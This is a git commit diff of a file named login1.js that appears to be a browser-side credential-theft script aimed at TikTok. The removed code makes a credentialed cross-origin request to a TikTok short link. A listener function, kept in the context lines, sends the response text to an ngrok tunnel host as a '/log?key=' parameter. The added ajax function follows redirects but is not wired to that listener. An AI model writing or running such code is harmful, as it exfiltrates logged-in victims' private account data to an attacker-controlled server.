38390748b521ca49af1a12dd6f3176dafd954e4b
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-01 00:44:04 +0700

    Update login1.js

--- login1.js
+++ login1.js
@@ -1,9 +1,24 @@
-var xhr = new XMLHttpRequest();
-xhr.onload = reqListener; 
-xhr.open("GET", "https://www.tiktok.com/t/ZSLQjruAd");
-xhr.withCredentials = true;
-xhr.setRequestHeader("Content-Type", "text/html; Charset=utf-8");
-xhr.send();
+function ajax(url /* ,params */, callback) {
+  var xmlhttp = new XMLHttpRequest();
+  xmlhttp.onreadystatechange = function() {
+      // return if not ready state 4
+      if (this.readyState !== 4) {
+        return;
+      }
+
+      // check for redirect
+      if (this.status === 302 /* or may any other redirect? */) {
+        var location = this.getResponseHeader("Location");
+        return ajax.call(this, location /*params*/, callback);
+      } 
+
+      // return data
+      var data = JSON.parse(this.responseText);
+      callback(data);
+  }
+  xmlhttp.open("GET", "https://www.tiktok.com/t/ZSLQjXDF7/", true);
+  xmlhttp.send();
+}
 
 function reqListener() {
     location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
